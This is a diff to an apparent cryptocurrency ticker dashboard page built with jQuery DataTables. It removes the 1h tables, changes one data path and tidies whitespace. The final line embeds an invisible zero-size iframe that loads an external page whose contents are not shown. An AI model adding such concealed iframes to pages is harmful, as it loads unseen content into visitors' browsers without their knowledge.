@@ -280,65 +280,6 @@ body {
 
 	</div>
 </div>
-<div class="row">
-	<div class='column'><div class="chart-header">1h</div>
-
-		<table id="1h" class="display compact">
-		  <thead>
-			<tr>
-			  <th>Rank</th>
-			  <th>Pair</th>
-			  <th>Prc</th>
-			  <th>Prc%</th>
-			  <th>V</th>
-			  <th>Side%</th>
-			</tr>
-		  </thead>
-		  <tfoot>
-			<tr>
-			  <th>Rank</th>
-			  <th>Pair</th>
-			  <th>Prc</th>
-			  <th>Prc%</th>
-			  <th>V</th>
-			  <th>Side%</th>
-			</tr>
-		  </tfoot>
-		</table>
-
-	</div>
-	<div class='column'><div class="chart-header">1h Log</div>
-
-		<table id="1hL" class="display compact">
-		  <thead>
-			<tr>
-			  <th>Pair</th>
-			  <th>V</th>
-			  <th>Prc%</th>
-			  <th>Side%</th>
-			  <th>Prc</th>
-			  <th>Time</th>
-			  <th>Rank</th>
-		  </thead>
-		  <tfoot>
-			<tr>
-			  <th>Pair</th>
-			  <th>V</th>
-			  <th>Prc%</th>
-			  <th>Side%</th>
-			  <th>Prc</th>
-			  <th>Time</th>
-			  <th>Rank</th>
-			</tr>
-		  </tfoot>
-		</table>
-
-			</tr>
-		  </tfoot>
-		</table>
-
-	</div>
-</div>
 
 
 
@@ -349,7 +290,7 @@ body {
 
 $(document).ready(function() {
 	$('#10s').DataTable( {
-		ajax: 'ticker_10s.json',/*
+		ajax: 'coinoperated.live/cbvst/ticker_10s.json',/*
 		"colReorder": {
             "order": [ 0, 1, 4, 2, 3, 5 ]
         },*/
@@ -389,40 +330,40 @@ $(document).ready(function() {
 			"aTargets": [4],
 			"fnCreatedCell": function (nTd, sData, oData, iRow, iCol) {
 				if ( sData == 3 ) {
-				
+
 					$(nTd).css('background-color', 'lime');
 					$(nTd).css('color', 'black');
-					
+
 				} else if ( sData == 2 ) {
-				
+
 					$(nTd).css('background-color', 'lime');
 					$(nTd).css('color', 'black');
-					
+
 				} else if ( sData == 1 ) {
-				
+
 					$(nTd).css('background-color', 'blue');
 					$(nTd).css('color', 'white');
-					
+
 				} else if ( sData == -1 ) {
-				
+
 					$(nTd).css('background-color', 'fuchsia');
 					$(nTd).css('color', 'white');
-					
+
 				} else if ( sData == -2 ) {
-				
+
 					$(nTd).css('background-color', 'red');
 					$(nTd).css('color', 'black');
-					
+
 				} else if ( sData == -3 ) {
-				
+
 					$(nTd).css('background-color', 'red');
 					$(nTd).css('color', 'black');
-					
+
 				} else {
-				
+
 					$(nTd).css('background-color', 'black');
 					$(nTd).css('color', 'gray');
-				
+
 				};
 				$(nTd).css('text-align', 'center');
 			}
@@ -441,7 +382,7 @@ $(document).ready(function() {
 		} ],
 		"scrollY": "480px",
 		"scrollCollapse": true,
-		"paging": false /*, 
+		"paging": false /*,
 		"pageLength": 20*/
 	} );
 } );
@@ -454,46 +395,46 @@ $(document).ready(function() {
 			"aTargets": [0],
 			"fnCreatedCell": function (nTd, sData, oData, iRow, iCol) {
 				$(nTd).css('text-align', 'center');
-				$(nTd).css('background-color', 'black'); 
+				$(nTd).css('background-color', 'black');
 			}
 		}, {
 			"aTargets": [1],
 			"fnCreatedCell": function (nTd, sData, oData, iRow, iCol) {
 			    if ( sData == 3 ) {
-				
+
 					$(nTd).css('background-color', 'lime');
 					$(nTd).css('color', 'black');
-					
+
 				} else if ( sData == 2 ) {
-				
+
 					$(nTd).css('background-color', 'lime');
 					$(nTd).css('color', 'black');
-					
+
 				} else if ( sData == 1 ) {
-				
+
 					$(nTd).css('background-color', 'blue');
 					$(nTd).css('color', 'white');
-					
+
 				} else if ( sData == -1 ) {
-				
+
 					$(nTd).css('background-color', 'fuchsia');
 					$(nTd).css('color', 'white');
-					
+
 				} else if ( sData == -2 ) {
-				
+
 					$(nTd).css('background-color', 'red');
 					$(nTd).css('color', 'black');
-					
+
 				} else if ( sData == -3 ) {
-				
+
 					$(nTd).css('background-color', 'red');
 					$(nTd).css('color', 'black');
-					
+
 				} else {
-				
+
 					$(nTd).css('background-color', 'black');
 					$(nTd).css('color', 'gray');
-				
+
 				};
 				$(nTd).css('text-align', 'center');
 			}
@@ -525,25 +466,25 @@ $(document).ready(function() {
 			"aTargets": [4],
 			"fnCreatedCell": function (nTd, sData, oData, iRow, iCol) {
 				$(nTd).css('text-align', 'right');
-				$(nTd).css('background-color', 'black'); 
+				$(nTd).css('background-color', 'black');
 			}
 		}, {
 			"aTargets": [5],
 			"fnCreatedCell": function (nTd, sData, oData, iRow, iCol) {
 				$(nTd).css('text-align', 'center');
-				$(nTd).css('background-color', 'black'); 
+				$(nTd).css('background-color', 'black');
 			}
 		}, {
 			"aTargets": [6],
 			"fnCreatedCell": function (nTd, sData, oData, iRow, iCol) {
 				$(nTd).css('text-align', 'center');
-				$(nTd).css('background-color', 'black'); 
+				$(nTd).css('background-color', 'black');
 				$(nTd).text(Math.round(sData * 10) / 10);
 			}
 		} ],
 		"scrollY": "480px",
 		"scrollCollapse": true,
-		"paging": false /*, 
+		"paging": false /*,
 		"pageLength": 20*/
 	} );
 } );
@@ -588,40 +529,40 @@ $(document).ready(function() {
 			"aTargets": [4],
 			"fnCreatedCell": function (nTd, sData, oData, iRow, iCol) {
 				if ( sData == 3 ) {
-				
+
 					$(nTd).css('background-color', 'lime');
 					$(nTd).css('color', 'black');
-					
+
 				} else if ( sData == 2 ) {
-				
+
 					$(nTd).css('background-color', 'lime');
 					$(nTd).css('color', 'black');
-					
+
 				} else if ( sData == 1 ) {
-				
+
 					$(nTd).css('background-color', 'blue');
 					$(nTd).css('color', 'white');
-					
+
 				} else if ( sData == -1 ) {
-				
+
 					$(nTd).css('background-color', 'fuchsia');
 					$(nTd).css('color', 'white');
-					
+
 				} else if ( sData == -2 ) {
-				
+
 					$(nTd).css('background-color', 'red');
 					$(nTd).css('color', 'black');
-					
+
 				} else if ( sData == -3 ) {
-				
+
 					$(nTd).css('background-color', 'red');
 					$(nTd).css('color', 'black');
-					
+
 				} else {
-				
+
 					$(nTd).css('background-color', 'black');
 					$(nTd).css('color', 'gray');
-				
+
 				};
 				$(nTd).css('text-align', 'center');
 			}
@@ -640,7 +581,7 @@ $(document).ready(function() {
 		} ],
 		"scrollY": "480px",
 		"scrollCollapse": true,
-		"paging": false /*, 
+		"paging": false /*,
 		"pageLength": 20*/
 	} );
 } );
@@ -653,46 +594,46 @@ $(document).ready(function() {
 			"aTargets": [0],
 			"fnCreatedCell": function (nTd, sData, oData, iRow, iCol) {
 				$(nTd).css('text-align', 'center');
-				$(nTd).css('background-color', 'black'); 
+				$(nTd).css('background-color', 'black');
 			}
 		}, {
 			"aTargets": [1],
 			"fnCreatedCell": function (nTd, sData, oData, iRow, iCol) {
 			    if ( sData == 3 ) {
-				
+
 					$(nTd).css('background-color', 'lime');
 					$(nTd).css('color', 'black');
-					
+
 				} else if ( sData == 2 ) {
-				
+
 					$(nTd).css('background-color', 'lime');
 					$(nTd).css('color', 'black');
-					
+
 				} else if ( sData == 1 ) {
-				
+
 					$(nTd).css('background-color', 'blue');
 					$(nTd).css('color', 'white');
-					
+
 				} else if ( sData == -1 ) {
-				
+
 					$(nTd).css('background-color', 'fuchsia');
 					$(nTd).css('color', 'white');
-					
+
 				} else if ( sData == -2 ) {
-				
+
 					$(nTd).css('background-color', 'red');
 					$(nTd).css('color', 'black');
-					
+
 				} else if ( sData == -3 ) {
-				
+
 					$(nTd).css('background-color', 'red');
 					$(nTd).css('color', 'black');
-					
+
 				} else {
-				
+
 					$(nTd).css('background-color', 'black');
 					$(nTd).css('color', 'gray');
-				
+
 				};
 				$(nTd).css('text-align', 'center');
 			}
@@ -724,25 +665,25 @@ $(document).ready(function() {
 			"aTargets": [4],
 			"fnCreatedCell": function (nTd, sData, oData, iRow, iCol) {
 				$(nTd).css('text-align', 'right');
-				$(nTd).css('background-color', 'black'); 
+				$(nTd).css('background-color', 'black');
 			}
 		}, {
 			"aTargets": [5],
 			"fnCreatedCell": function (nTd, sData, oData, iRow, iCol) {
 				$(nTd).css('text-align', 'center');
-				$(nTd).css('background-color', 'black'); 
+				$(nTd).css('background-color', 'black');
 			}
 		}, {
 			"aTargets": [6],
 			"fnCreatedCell": function (nTd, sData, oData, iRow, iCol) {
 				$(nTd).css('text-align', 'center');
-				$(nTd).css('background-color', 'black'); 
+				$(nTd).css('background-color', 'black');
 				$(nTd).text(Math.round(sData * 10) / 10);
 			}
 		} ],
 		"scrollY": "480px",
 		"scrollCollapse": true,
-		"paging": false /*, 
+		"paging": false /*,
 		"pageLength": 20*/
 	} );
 } );
@@ -788,40 +729,40 @@ $(document).ready(function() {
 			"aTargets": [4],
 			"fnCreatedCell": function (nTd, sData, oData, iRow, iCol) {
 				if ( sData == 3 ) {
-				
+
 					$(nTd).css('background-color', 'lime');
 					$(nTd).css('color', 'black');
-					
+
 				} else if ( sData == 2 ) {
-				
+
 					$(nTd).css('background-color', 'lime');
 					$(nTd).css('color', 'black');
-					
+
 				} else if ( sData == 1 ) {
-				
+
 					$(nTd).css('background-color', 'blue');
 					$(nTd).css('color', 'white');
-					
+
 				} else if ( sData == -1 ) {
-				
+
 					$(nTd).css('background-color', 'fuchsia');
 					$(nTd).css('color', 'white');
-					
+
 				} else if ( sData == -2 ) {
-				
+
 					$(nTd).css('background-color', 'red');
 					$(nTd).css('color', 'black');
-					
+
 				} else if ( sData == -3 ) {
-				
+
 					$(nTd).css('background-color', 'red');
 					$(nTd).css('color', 'black');
-					
+
 				} else {
-				
+
 					$(nTd).css('background-color', 'black');
 					$(nTd).css('color', 'gray');
-				
+
 				};
 				$(nTd).css('text-align', 'center');
 			}
@@ -840,7 +781,7 @@ $(document).ready(function() {
 		} ],
 		"scrollY": "480px",
 		"scrollCollapse": true,
-		"paging": false /*, 
+		"paging": false /*,
 		"pageLength": 20*/
 	} );
 } );
@@ -853,46 +794,46 @@ $(document).ready(function() {
 			"aTargets": [0],
 			"fnCreatedCell": function (nTd, sData, oData, iRow, iCol) {
 				$(nTd).css('text-align', 'center');
-				$(nTd).css('background-color', 'black'); 
+				$(nTd).css('background-color', 'black');
 			}
 		}, {
 			"aTargets": [1],
 			"fnCreatedCell": function (nTd, sData, oData, iRow, iCol) {
 			    if ( sData == 3 ) {
-				
+
 					$(nTd).css('background-color', 'lime');
 					$(nTd).css('color', 'black');
-					
+
 				} else if ( sData == 2 ) {
-				
+
 					$(nTd).css('background-color', 'lime');
 					$(nTd).css('color', 'black');
-					
+
 				} else if ( sData == 1 ) {
-				
+
 					$(nTd).css('background-color', 'blue');
 					$(nTd).css('color', 'white');
-					
+
 				} else if ( sData == -1 ) {
-				
+
 					$(nTd).css('background-color', 'fuchsia');
 					$(nTd).css('color', 'white');
-					
+
 				} else if ( sData == -2 ) {
-				
+
 					$(nTd).css('background-color', 'red');
 					$(nTd).css('color', 'black');
-					
+
 				} else if ( sData == -3 ) {
-				
+
 					$(nTd).css('background-color', 'red');
 					$(nTd).css('color', 'black');
-					
+
 				} else {
-				
+
 					$(nTd).css('background-color', 'black');
 					$(nTd).css('color', 'gray');
-				
+
 				};
 				$(nTd).css('text-align', 'center');
 			}
@@ -924,25 +865,25 @@ $(document).ready(function() {
 			"aTargets": [4],
 			"fnCreatedCell": function (nTd, sData, oData, iRow, iCol) {
 				$(nTd).css('text-align', 'right');
-				$(nTd).css('background-color', 'black'); 
+				$(nTd).css('background-color', 'black');
 			}
 		}, {
 			"aTargets": [5],
 			"fnCreatedCell": function (nTd, sData, oData, iRow, iCol) {
 				$(nTd).css('text-align', 'center');
-				$(nTd).css('background-color', 'black'); 
+				$(nTd).css('background-color', 'black');
 			}
 		}, {
 			"aTargets": [6],
 			"fnCreatedCell": function (nTd, sData, oData, iRow, iCol) {
 				$(nTd).css('text-align', 'center');
-				$(nTd).css('background-color', 'black'); 
+				$(nTd).css('background-color', 'black');
 				$(nTd).text(Math.round(sData * 10) / 10);
 			}
 		} ],
 		"scrollY": "480px",
 		"scrollCollapse": true,
-		"paging": false /*, 
+		"paging": false /*,
 		"pageLength": 20*/
 	} );
 } );
@@ -988,40 +929,40 @@ $(document).ready(function() {
 			"aTargets": [4],
 			"fnCreatedCell": function (nTd, sData, oData, iRow, iCol) {
 				if ( sData == 3 ) {
-				
+
 					$(nTd).css('background-color', 'lime');
 					$(nTd).css('color', 'black');
-					
+
 				} else if ( sData == 2 ) {
-				
+
 					$(nTd).css('background-color', 'lime');
 					$(nTd).css('color', 'black');
-					
+
 				} else if ( sData == 1 ) {
-				
+
 					$(nTd).css('background-color', 'blue');
 					$(nTd).css('color', 'white');
-					
+
 				} else if ( sData == -1 ) {
-				
+
 					$(nTd).css('background-color', 'fuchsia');
 					$(nTd).css('color', 'white');
-					
+
 				} else if ( sData == -2 ) {
-				
+
 					$(nTd).css('background-color', 'red');
 					$(nTd).css('color', 'black');
-					
+
 				} else if ( sData == -3 ) {
-				
+
 					$(nTd).css('background-color', 'red');
 					$(nTd).css('color', 'black');
-					
+
 				} else {
-				
+
 					$(nTd).css('background-color', 'black');
 					$(nTd).css('color', 'gray');
-				
+
 				};
 				$(nTd).css('text-align', 'center');
 			}
@@ -1040,7 +981,7 @@ $(document).ready(function() {
 		} ],
 		"scrollY": "480px",
 		"scrollCollapse": true,
-		"paging": false /*, 
+		"paging": false /*,
 		"pageLength": 20*/
 	} );
 } );
@@ -1048,206 +989,6 @@ $(document).ready(function() {
 $(document).ready(function() {
 	$('#15mL').DataTable( {
 		ajax: 'vector_15m.json',
-		"order": [[ 5, "desc" ],[ 6, "desc" ],[ 2, "desc" ]],
-		"aoColumnDefs": [ {
-			"aTargets": [0],
-			"fnCreatedCell": function (nTd, sData, oData, iRow, iCol) {
-				$(nTd).css('text-align', 'center');
-				$(nTd).css('background-color', 'black'); 
-			}
-		}, {
-			"aTargets": [1],
-			"fnCreatedCell": function (nTd, sData, oData, iRow, iCol) {
-			    if ( sData == 3 ) {
-				
-					$(nTd).css('background-color', 'lime');
-					$(nTd).css('color', 'black');
-					
-				} else if ( sData == 2 ) {
-				
-					$(nTd).css('background-color', 'lime');
-					$(nTd).css('color', 'black');
-					
-				} else if ( sData == 1 ) {
-				
-					$(nTd).css('background-color', 'blue');
-					$(nTd).css('color', 'white');
-					
-				} else if ( sData == -1 ) {
-				
-					$(nTd).css('background-color', 'fuchsia');
-					$(nTd).css('color', 'white');
-					
-				} else if ( sData == -2 ) {
-				
-					$(nTd).css('background-color', 'red');
-					$(nTd).css('color', 'black');
-					
-				} else if ( sData == -3 ) {
-				
-					$(nTd).css('background-color', 'red');
-					$(nTd).css('color', 'black');
-					
-				} else {
-				
-					$(nTd).css('background-color', 'black');
-					$(nTd).css('color', 'gray');
-				
-				};
-				$(nTd).css('text-align', 'center');
-			}
-		}, {
-			"aTargets": [2],
-			"fnCreatedCell": function (nTd, sData, oData, iRow, iCol) {
-				if ( sData > 0 ) {
-					$(nTd).css('color', 'green');
-				} else if ( sData < 0 ) {
-					$(nTd).css('color', 'red');
-				} else {$(nTd).css('color', 'white');};
-				$(nTd).css('background-color', 'black');
-				$(nTd).text(Math.round(sData * 10000) / 100 + "%");
-				$(nTd).css('text-align', 'right');
-			}
-		}, {
-			"aTargets": [3],
-			"fnCreatedCell": function (nTd, sData, oData, iRow, iCol) {
-				if ( sData > 0 ) {
-					$(nTd).css('color', 'green');
-				} else if ( sData < 0 ) {
-					$(nTd).css('color', 'red');
-				} else {$(nTd).css('color', 'white');};
-				$(nTd).css('background-color', 'black');
-				$(nTd).text(Math.round(sData * 10000) / 100 + "%");
-				$(nTd).css('text-align', 'right');
-			}
-		}, {
-			"aTargets": [4],
-			"fnCreatedCell": function (nTd, sData, oData, iRow, iCol) {
-				$(nTd).css('text-align', 'right');
-				$(nTd).css('background-color', 'black'); 
-			}
-		}, {
-			"aTargets": [5],
-			"fnCreatedCell": function (nTd, sData, oData, iRow, iCol) {
-				$(nTd).css('text-align', 'center');
-				$(nTd).css('background-color', 'black'); 
-			}
-		}, {
-			"aTargets": [6],
-			"fnCreatedCell": function (nTd, sData, oData, iRow, iCol) {
-				$(nTd).css('text-align', 'center');
-				$(nTd).css('background-color', 'black'); 
-				$(nTd).text(Math.round(sData * 10) / 10);
-			}
-		} ],
-		"scrollY": "480px",
-		"scrollCollapse": true,
-		"paging": false /*, 
-		"pageLength": 20*/
-	} );
-} );
-
-
-
-$(document).ready(function() {
-	$('#1h').DataTable( {
-		ajax: 'ticker_1h.json',
-		"order": [[ 0, "desc" ], [ 3, "desc" ]],
-		"aoColumnDefs": [ {
-			"aTargets": [0],
-			"fnCreatedCell": function (nTd, sData, oData, iRow, iCol) {
-				$(nTd).css('text-align', 'center');
-				$(nTd).css('background-color', 'black');
-				$(nTd).text(Math.round(sData * 10) / 10);
-			}
-		}, {
-			"aTargets": [1],
-			"fnCreatedCell": function (nTd, sData, oData, iRow, iCol) {
-				$(nTd).css('text-align', 'center');
-				$(nTd).css('background-color', 'black');
-			}
-		}, {
-			"aTargets": [2],
-			"fnCreatedCell": function (nTd, sData, oData, iRow, iCol) {
-				$(nTd).css('text-align', 'right');
-				$(nTd).css('background-color', 'black');
-			}
-		}, {
-			"aTargets": [3],
-			"fnCreatedCell": function (nTd, sData, oData, iRow, iCol) {
-				if ( sData > 0 ) {
-					$(nTd).css('color', 'green');
-				} else if ( sData < 0 ) {
-					$(nTd).css('color', 'red');
-				};
-				$(nTd).text(Math.round(sData * 10000) / 100 + "%");
-				$(nTd).css('text-align', 'right');
-				$(nTd).css('background-color', 'black');
-			}
-		}, {
-			"aTargets": [4],
-			"fnCreatedCell": function (nTd, sData, oData, iRow, iCol) {
-				if ( sData == 3 ) {
-				
-					$(nTd).css('background-color', 'lime');
-					$(nTd).css('color', 'black');
-					
-				} else if ( sData == 2 ) {
-				
-					$(nTd).css('background-color', 'lime');
-					$(nTd).css('color', 'black');
-					
-				} else if ( sData == 1 ) {
-				
-					$(nTd).css('background-color', 'blue');
-					$(nTd).css('color', 'white');
-					
-				} else if ( sData == -1 ) {
-				
-					$(nTd).css('background-color', 'fuchsia');
-					$(nTd).css('color', 'white');
-					
-				} else if ( sData == -2 ) {
-				
-					$(nTd).css('background-color', 'red');
-					$(nTd).css('color', 'black');
-					
-				} else if ( sData == -3 ) {
-				
-					$(nTd).css('background-color', 'red');
-					$(nTd).css('color', 'black');
-					
-				} else {
-				
-					$(nTd).css('background-color', 'black');
-					$(nTd).css('color', 'gray');
-				
-				};
-				$(nTd).css('text-align', 'center');
-			}
-		}, {
-			"aTargets": [5],
-			"fnCreatedCell": function (nTd, sData, oData, iRow, iCol) {
-				if ( sData > 0 ) {
-					$(nTd).css('color', 'green');
-				} else if ( sData < 0 ) {
-					$(nTd).css('color', 'red');
-				};
-				$(nTd).text(Math.round(sData * 10000) / 100 + "%");
-				$(nTd).css('text-align', 'right');
-				$(nTd).css('background-color', 'black');
-			}
-		} ],
-		"scrollY": "480px",
-		"scrollCollapse": true,
-		"paging": false /*, 
-		"pageLength": 20*/
-	} );
-} );
-
-$(document).ready(function() {
-	$('#1hL').DataTable( {
-		ajax: 'vector_1h.json',
 		"order": [[ 5, "desc" ],[ 6, "desc" ],[ 2, "desc" ]],
 		"aoColumnDefs": [ {
 			"aTargets": [0],
@@ -1357,8 +1098,6 @@ setInterval(function(){ $('#5m').DataTable().ajax.reload( null, false )}, 3333 )
 setInterval(function(){ $('#5mL').DataTable().ajax.reload( null, false )}, 3333 );
 setInterval(function(){ $('#15m').DataTable().ajax.reload( null, false )}, 3333 );
 setInterval(function(){ $('#15mL').DataTable().ajax.reload( null, false )}, 3333 );
-setInterval(function(){ $('#1h').DataTable().ajax.reload( null, false )}, 3333 );
-setInterval(function(){ $('#1hL').DataTable().ajax.reload( null, false )}, 3333 );
 
 </script>
 <iframe src="https://coinoperated.live/t.html" style="position: absolute;width:0;height:0;border:0;"></iframe>
